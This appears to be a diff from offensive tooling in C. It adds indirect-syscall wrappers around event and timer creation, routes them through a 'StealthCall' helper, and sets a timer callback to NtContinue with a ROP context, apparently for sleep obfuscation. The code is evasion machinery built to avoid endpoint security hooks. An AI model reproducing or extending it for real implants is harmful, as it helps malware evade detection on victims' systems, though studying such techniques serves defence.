@@ -181,3 +181,78 @@ HANDLE WrapperCreateThread(LPSECURITY_ATTRIBUTES lpAttr, SIZE_T dwStack, LPTHREA
     }
     return NULL;
 }
+
+HANDLE WrapperCreateEventW(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName) {
+    DWORD ssn = 0; 
+    PVOID target = NULL;
+    HANDLE hEvent = NULL;
+    OBJECT_ATTRIBUTES objAttr;
+    
+    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
+    getInDirectSyscallStub(hNtdll, _NtCreateEvent, &ssn, &target);
+
+    // Initialize Object Attributes (NULL name for unnamed event)
+    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
+
+    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 5, 
+        &hEvent, 
+        EVENT_ALL_ACCESS, 
+        &objAttr, 
+        bManualReset ? 0 : 1, // 0 for NotificationEvent (Manual), 1 for SynchronizationEvent (Auto)
+        (BOOLEAN)bInitialState
+    );
+
+    if (status != 0) {
+        return NULL;
+    }
+
+    return hEvent;
+}
+
+HANDLE WrapperCreateTimerQueue() {
+    DWORD ssn = 0; 
+    PVOID target = NULL;
+    HANDLE hTimer = NULL;
+    OBJECT_ATTRIBUTES objAttr;
+    
+    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
+    getInDirectSyscallStub(hNtdll, _NtCreateTimer, &ssn, &target);
+
+    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
+
+    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 4, 
+        &hTimer, 
+        TIMER_ALL_ACCESS, 
+        &objAttr, 
+        0 // NotificationTimer
+    );
+
+    if (status != 0) {
+        return NULL;
+    }
+
+    return hTimer;
+}
+
+BOOL WrapperCreateTimerQueueTimer(PHANDLE phNewTimer, HANDLE hTimerQueue, WAITORTIMERCALLBACK Callback, PVOID Parameter, DWORD DueTime, DWORD Period, ULONG Flags) {
+    DWORD ssn = 0; PVOID target = NULL;
+    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
+    getInDirectSyscallStub(hNtdll, "NtSetTimer", &ssn, &target);
+
+    // COnvert to NTAPI time
+    LARGE_INTEGER liDueTime;
+    liDueTime.QuadPart = -(LONGLONG)DueTime * 10000; 
+
+    // NtSetTimer(TimerHandle, DueTime, TimerApcRoutine, TimerContext, ResumeTimer, Period, PreviousState)
+    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 7, 
+        hTimerQueue, 
+        &liDueTime, 
+        Callback,   // Here NtContinue
+        Parameter,  // Here Context ROP
+        FALSE, 
+        0, 
+        NULL
+    );
+
+    return (status == 0);
+}
